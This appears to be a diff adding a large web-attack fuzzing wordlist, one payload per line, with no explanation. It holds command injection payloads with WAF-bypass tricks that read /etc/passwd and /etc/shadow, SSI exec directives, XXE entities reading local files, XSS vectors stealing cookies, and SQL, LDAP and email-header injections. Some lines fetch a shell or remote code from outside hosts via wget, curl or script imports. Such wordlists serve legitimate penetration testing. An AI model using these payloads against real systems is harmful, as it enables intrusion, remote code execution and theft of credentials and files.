+%7Ccat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd
+%7Ccat%24IFS%2Fetc%2Fpasswd
+%7Ccat%24u%20%2Fetc%24u%2Fpasswd%24u
+%7Ccat%2520%2Fetc%2Fpasswd
+%7Ccat%3C%2Fetc%2Fpasswd
+%7Cecho%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd
+%7Cid
+%7cid;pwd;uname -a
+%7Cid%3B
+%7Cid%7C
+%7Cuname%20-a%2B%7C%7Ca%2B%23%27%2B%7Cls%2B-la%7Ca%2B%23%7C%22%2B%7Cls%2B-la%7C%7Ca%2B%23
+%7f
+%8C%A8%27 Or 1-- 2
+%8C%A8%27 Or 1=1-- 2
+%8C%A8%27) Or 1-- 2
+%8C%A8%27) Or 1=1-- 2
+%8C%A8%27)||1-- 2
+%8C%A8%27)Or(1)-- 2
+%8C%A8%27||1-- 2
+%8C%A8%27Or(1)-- 2
+%99999999999s
+%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a
+%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A
+%A8%27 Or 1-- 2
+%A8%27 Or 1=1-- 2
+%A8%27) Or 1-- 2
+%A8%27) Or 1=1-- 2
+%A8%27)||1-- 2
+%A8%27)Or(1)-- 2
+%A8%27||1-- 2
+%A8%27Or(1)-- 2
+%bf' Or 1-- 2
+%bf' Or 1=1 -- 2
+%bf') Or 1-- 2
+%bf') Or 1=1 -- 2
+%bf')||1-- 2
+%bf')Or(1)-- 2
+%bf'||1-- 2
+%bf'Or(1)-- 2
+%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d
+%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e
+%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E
+%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%ef%bd%82%ef%bd%8f%ef%bd%8f%ef%bd%94%e2%80%a4%e2%85%b0%ef%bd%8e%e2%85%b0
+%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%ef%bd%85%ef%bd%94%e2%85%bd%ef%bc%8f%ef%bd%90%ef%bd%81%ef%bd%93%ef%bd%93%ef%bd%97%e2%85%be
+%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f
+%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F
+%ff
+%foo;
+%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g
+%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G
+%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i
+%id
+%id%
+%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o
+%oa ping -n 30 127.0.0.1 %0a
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+%s%p%x%d
+%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X
+`
+`{cat,/etc/passwd}`
+`/usr/bin/id`
+``
+`cat /e${hahaha}tc/${heywaf}pas${catchthis}swd`
+`cat%20/etc/passwd`
+`cat</etc/passwd`
+`cat$IFS/etc/passwd`
+`cat$u /etc$u/passwd$u`
+`dir`
+`echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd`
+`id`
+`id` &
+`id`&
+`perl -e 'print ".%p" x 80'`%n
+`ping 127.0.0.1 -c 4`
+`ping 127.0.0.1`
+`sleep 10`111.jpg
+^'
+^&apos;
+^id
++
++%00
+<
+<  script > < / script>
+<!
+<!--#config errmsg="File not found, informs users and password"-->
+<!--#config timefmt="A %B %d %Y %r"-->
+<!--#echo var="auth_type" -->
+<!--#echo var="content_length" -->
+<!--#echo var="content_type" -->
+<!--#echo var="date_gmt" -->
+<!--#echo var="date_local" -->
+<!--#echo var="DATE_LOCAL" -->
+<!--#echo var="document_name" -->
+<!--#echo var="DOCUMENT_NAME" -->
+<!--#echo var="document_root" -->
+<!--#echo var="document_uri" -->
+<!--#echo var="DOCUMENT_URI" -->
+<!--#echo var="forwarded" -->
+<!--#echo var="from" -->
+<!--#echo var="gateway_interface" -->
+<!--#echo var="http_accept_charset" -->
+<!--#echo var="http_accept_encoding" -->
+<!--#echo var="http_accept_language" -->
+<!--#echo var="http_accept" -->
+<!--#echo var="http_client_ip" -->
+<!--#echo var="http_connection" -->
+<!--#echo var="http_cookie" -->
+<!--#echo var="http_form" -->
+<!--#echo var="http_host" -->
+<!--#echo var="http_referer" -->
+<!--#echo var="http_ua_cpu" -->
+<!--#echo var="http_ua_os" -->
+<!--#echo var="http_user_agent" -->
+<!--#echo var="last_modified" -->
+<!--#echo var="netsite_root" -->
+<!--#echo var="page_count" -->
+<!--#echo var="path_info_translated" -->
+<!--#echo var="path_info" -->
+<!--#echo var="path_translated" -->
+<!--#echo var="path" -->
+<!--#echo var="query_string_unescaped" -->
+<!--#echo var="query_string" -->
+<!--#echo var="remote_addr" -->
+<!--#echo var="remote_host" -->
+<!--#echo var="remote_ident" -->
+<!--#echo var="remote_port" -->
+<!--#echo var="remote_user" -->
+<!--#echo var="request_method" -->
+<!--#echo var="request_method" -->	
+<!--#echo var="request_uri" -->
+<!--#echo var="script_filename" -->
+<!--#echo var="script_name" -->
+<!--#echo var="script_uri" -->
+<!--#echo var="script_url" -->
+<!--#echo var="server_addr" -->
+<!--#echo var="server_admin" -->
+<!--#echo var="server_name -->
+<!--#echo var="server_port" -->
+<!--#echo var="server_protocol" -->
+<!--#echo var="server_software" -->
+<!--#echo var="site_htmlroot" -->
+<!--#echo var="total_hits" -->
+<!--#echo var="tz" -->
+<!--#echo var="unique_id" -->
+<!--#echo var="user_name" -->
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/bin/ls /" -->
+<!--#exec cmd="/bin/ls /" --><br/>
+<!--#exec cmd="/usr/bin/id;-->
+<!--#exec cmd="/usr/bin/id"-->
+<!--#exec cmd="cat /etc/passwd" -->
+<!--#exec cmd="cat /etc/passwd" --><br/>
+<!--#exec cmd="cd C:\WINDOWS\System32">
+<!--#exec cmd="curl http://sn1persecurity.com/.testing/rfi_vuln.php" -->
+<!--#exec cmd="dir" -->
+<!--#exec cmd="find / -name *.* -print" --><br/>
+<!--#exec cmd="id;-->
+<!--#exec cmd="id"-->
+<!--#exec cmd="ipconfig" -->
+<!--#exec cmd="ls" -->
+<!--#exec cmd="mail Florian Roth @4nc4p <mailto:Florian Roth @4nc4p> < cat /etc/passwd" --><br/>
+<!--#exec cmd="perl -e 'print "X"*5000'" -->
+<!--#exec cmd="sleep 10" -->
+<!--#exec cmd="sleep 5" -->
+<!--#exec cmd="uname" -->
+<!--#exec cmd="wget http://website.com/dir/shell.txt" -->
+<!--#exec cmd="whoami" -->
+<!--#exec cmd="whoami"-->
+<!--#flastmod virtual="echo.html" -->
+<!--#fsize file="ssi.shtml" -->
+<!--#include file=?UUUUUUUU...UU?-->
+<!--#include virtual="/" -->
+<!--#include virtual="/index.html" -->
+<!--#include virtual="http://sn1persecurity.com/.testing/rfi_vuln.php" -->
+<!--#include virtual="https://crowdshield.com/.testing/rfi_vuln.php" -->
+<!--#printenv -->
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<test></test>]]>
+<!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM "file:///etc/passwd">
+<!DOCTYPE autofillupload [<!ENTITY D71Mn SYSTEM "file:///c:/boot.ini">
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/text.txt" >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
+<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///c:/boot.ini"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
+<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
+<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  "> %int;
+<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://127.0.0.1:21/%data3;'>">
+<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >
+<?
+<?php system("cat /etc/passwd");?>
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/issue" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example:443" >]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com:80" >]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xee SYSTEM "file:///dev/random">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xee SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xee SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xee SYSTEM "file://c:/boot.ini">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foof>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><test></test>
+</foo>
+</nowiki>A
+<<
+<<<
+<<script>alert("XSS");//<</script>
+<>"'%;)(&+
+<esi:debug/>
+<esi:include src="http://google.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
+<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://google.com/poc.xsl" />
+<esi:include src=http://google.com/>
+<foo><![CDATA[' or 1=1 or ''=']]></foo>
+<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<foo></foo>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+<id
+<id;
+<id\n
+<id%0A
+<id%0D
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG DYNSRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC=`javascript:alert("'XSS'")`>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+<IMG%20SRC='javasc	ript:alert(document.cookie)'>
+<IMG%20SRC='javascript:alert(document.cookie)'>
+<name>','')); phpinfo(); exit;/*</name>
+<pre><!--#echo var="DATE_LOCAL" --> </pre>
+<pre><!--#exec cmd="dir" --></pre>
+<pre><!--#exec cmd="ls" --></pre>
+<pre><!--#exec cmd="whoami"--></pre>
+<script>alert("XSS")</script>
+<script>alert(document.cookie)</script>
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<test></test>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml SRC="xsstest.xml" ID=I></xml>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><script>alert(123)</script></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><xsl:template match="/"><xsl:value-of select="php:function('passthru','ls -la')"/></xsl:template></xsl:stylesheet>
+<xss><script>alert('XSS')</script></vulnerable>
+<youremail>%0aBcc:<youremail>
+<youremail>%0aCc:<youremail>
+<youremail>%0d%0aBcc:<youremail>
+<youremail>%0d%0aCc:<youremail>
+=
+= --
+= ;
+= '
+=--
+=;
+='
+==
+=3D “/..” . “%2f..
+>
+|
+| `id`
+| `id` #
+| id
+|{cat,/etc/passwd}
+|/bin/ls -al
+|/usr/bin/id
+|/usr/bin/id|
+||
+|| 1==1
+|| id
+|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
+||{cat,/etc/passwd}
+||/usr/bin/id;
+||/usr/bin/id|
+||/usr/bin/id||
+||cat /e${hahaha}tc/${heywaf}pas${catchthis}swd
+||cat%20/etc/passwd
+||cat</etc/passwd
+||cat$IFS/etc/passwd
+||cat$u /etc$u/passwd$u
+||echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
+||id
+||id;
+||id>/var/www/html/id.txt||
+||id|
+||id||
+||nslookup+`whoami`.localhost.com||
+||nslookup+www.nsa.gov||
+||ping+-c+10+127.0.0.1||
+||sleep 3.jpg
+|cat /e${hahaha}tc/${heywaf}pas${catchthis}swd
+|cat%20/etc/passwd
+|cat</etc/passwd
+|cat$IFS/etc/passwd
+|cat$u /etc$u/passwd$u
+|dir
+|dir|
+|echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
+|id
+|id;
+|id|
+|ls
+|ls -la
+|nid\n
+|uname -a+||a+#'+|ls+-la|a+#|"+|ls+-la||a+#  Rce waf bypass
+|usr/bin/id\n
+$;/usr/bin/id
+$;id
+$({cat,/etc/passwd})
+$(/usr/bin/id)
+$(`cat /etc/passwd`)
+$(cat /e${hahaha}tc/${heywaf}pas${catchthis}swd)
+$(cat%20/etc/passwd)
+$(cat</etc/passwd)
+$(cat$IFS/etc/passwd)
+$(cat$u /etc$u/passwd$u)
+$(echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd)
+$(id)
+$(sleep 3).jpg
+${@phpinfo()}
+${@system("id")} eval code bypass
+${10000+1}.jpg
+${10001*2}.jpg
+${PATH:0:1}bi?${PATH:0:1}ca?${IFS}${PATH:0:1}et?${PATH:0:1}??sswd
+${PATH##*s????}${PATH%%u*}bas${u}h${IFS}${PHP_CFLAGS%%f*}c${IFS}l${u}s
+${PATH##*s????}${PATH%%u*}c??${IFS}${PATH%%u*}e??${PATH%%u*}??ss??
+${PATH##*s????}${PATH%%u*}ca${u}t${IFS}${PATH%%u*}et${u}c${PATH%%u*}pas${u}swd
+$null
+$NULL
+$where: '1 == 1'
+0
+0 or 1=1
+0')&lt;'2'-- 2
+0')&lt;'2'/*
+0')&lt;'2'#
+0')&lt;('2
+0'&lt;'2
+0'&lt;'2'-- 2
+0'&lt;'2'/*
+0'&lt;'2'#
+0")&lt;"2-- 2
+0")&lt;"2/*
+0")&lt;"2#
+0")&lt;("2
+0"&lt;"2
+0"&lt;"2"-- 2
+0"&lt;"2"/*
+0"&lt;"2"#
+00
+0x00 waitfor delay '00:02'
+0x00 waitfor delay '00:02' -- 
+0x00 waitfor delay \'00:02\'
+0x00 waitfor delay \'00:02\' -- 
+0x00;waitfor delay '00:02'
+0x00;waitfor delay '00:02' -- 
+0x00;waitfor delay \'00:02\'
+0x00;waitfor delay \'00:02\' -- 
+0x00' waitfor delay '00:02' -- 
+0x00';waitfor delay '00:02' -- 
+0x00\' waitfor delay \'00:02\' -- 
+0x00\';waitfor delay \'00:02\' -- 
+0x00\\' waitfor delay \\'00:02\\' -- 
+0x00\\';waitfor delay \\'00:02\\' -- 
+0x0a waitfor delay '00:02'
+0x0a waitfor delay '00:02' -- 
+0x0a waitfor delay \'00:02\'
+0x0a waitfor delay \'00:02\' -- 
+0x0a;waitfor delay '00:02'
+0x0a;waitfor delay '00:02' -- 
+0x0a;waitfor delay \'00:02\'
+0x0a;waitfor delay \'00:02\' -- 
+0x0a' waitfor delay '00:02' -- 
+0x0a';waitfor delay '00:02' -- 
+0x0a\' waitfor delay \'00:02\' -- 
+0x0a\';waitfor delay \'00:02\' -- 
+0x0a\\' waitfor delay \\'00:02\\' -- 
+0x0a\\';waitfor delay \\'00:02\\' -- 
+0x0d0a waitfor delay '00:02'
+0x0d0a waitfor delay '00:02' -- 
+0x0d0a waitfor delay \'00:02\'
+0x0d0a waitfor delay \'00:02\' -- 
+0x0d0a;waitfor delay '00:02'
+0x0d0a;waitfor delay '00:02' -- 
+0x0d0a;waitfor delay \'00:02\'
+0x0d0a;waitfor delay \'00:02\' -- 
+0x0d0a' waitfor delay '00:02' -- 
+0x0d0a';waitfor delay '00:02' -- 
+0x0d0a\' waitfor delay \'00:02\' -- 
+0x0d0a\';waitfor delay \'00:02\' -- 
+0x0d0a\\' waitfor delay \\'00:02\\' -- 
+0x0d0a\\';waitfor delay \\'00:02\\' -- 
+0xde;curl http://exmaple.com/robots.txt ;
+0xde;wget http://exmaple.com/robots.txt ;
+0xfffffff
+0xFFFFFFFF
+1
+1 or 1 in (@@version)--
+1 or 1=1--
+1-false
+1-true
+1, $where: '1 == 1'
+1; waitfor delay '0:30:0'--
+1;SELECT%20*
+1;uname${IFS}-a
+1;uname${IFS}-a;#
+1;uname${IFS}-a;#${IFS}'
+1;uname${IFS}-a;#${IFS}';
+1.0
+1'or’1'=’1
+1*56
+1&sleep 3.jpg
+1′) and '1′='1–
+1||Utl_Http.request('http://<yourservername>') from dual--
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1234 " AND 1=0 UNION ALL SELECT "admin", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+127.0.0.1;i"d
+127.0.0.1;ls
+127.0.0.1%3Bi%22d
+127.0.0.1%3Bls
+2
+2147483647
+268435455
+4294967295
+65536
+7357=1
+7357=true
+7357=y
+7357=yes
+A
+a;/usr/bin/id
+a;/usr/bin/id;
+a;/usr/bin/id|
+a;id
+a;id;
+a;id|
+a);/usr/bin/id
+a);/usr/bin/id;
+a);/usr/bin/id|
+a);id
+a);id;
+a);id|
+a)|/usr/bin/id
+a)|/usr/bin/id;
+a)|id
+a)|id;
+a%29%3Bid
+a%29%3Bid%7C
+a%3Bid
+a%3Bid%3B
+a|/usr/bin/id
+a|id
+aaa&quot;&gt;&lt;img src=1&gt;.jpg
+ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|
+access=1
+access=true
+access=y
+access=yes
+adm=1
+adm=true
+adm=y
+adm=yes
+adm1n=1
+adm1n=true
+adm1n=y
+adm1n=yes
+admin' --
+admin' #
+admin' and substring(password/text(),1,1)='7
+admin' or '
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or '1'='1'#
+admin' or '1'='2
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1/*
+admin' or 1=1#
+admin'--
+admin'-- 2
+admin’–
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'/*
+admin') or '1'='1'#
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'/*
+admin') or ('1'='1'#
+admin')-- 2
+admin')/*
+admin')#
+admin'/*
+admin'#
+admin'or 1=1 or ''='
+admin" --
+admin" #
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"/*
+admin" or "1"="1"#
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1/*
+admin" or 1=1#
+admin"-- 2
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"/*
+admin") or "1"="1"#
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"/*
+admin") or ("1"="1"#
+admin")-- 2
+admin")#
+admin"/*
+admin"#
+admin"or 1=1 or ""="
+admin)(!(&(|
+admin)(&)
+admin))(|(|
+admin/access_log
+admin=1
+admin=true
+admin=y
+admin=yes
+AND 0
+AND 1
+and 1=1
+and 1=1–
+AND false
+AND true
+as
+asc
+badfile.''gif.jpg
+badfile.''jpg.jpg
+bfilename
+C:/boot.ini
+C:/inetpub/wwwroot/global.asa
+C:/Windows/win.ini
+c:\apache\logs\access.log
+c:\apache\logs\error.log
+c:\AppServ\MySQL
+C:\boot.ini
+C:\inetpub\wwwroot\global.asa
+c:\inetpub\wwwroot\index.asp
+c:\Program Files\Apache Group\Apache\logs\access.log
+c:\Program Files\Apache Group\Apache\logs\error.log
+c:\System32\Inetsrv\metabase.xml
+C:\Windows\win.ini
+c:WINDOWS/system32/
+c'a't /etc/passwd
+c"a"t /etc/passwd
+c\\a\\t+/et\\c/pas\\swd
+c\a\t /etc/passwd
+c%5C%5Ca%5C%5Ct%2B%2Fet%5C%5Cc%2Fpas%5C%5Cswd
+c${a}at${IFS}${APACHE_CONFDIR%apache2}pas${s}swd
+c${u}at${IFS}${PHP_INI_DIR%%u*p}e${u}tc${PHP_INI_DIR%%u*p}p${u}asswd
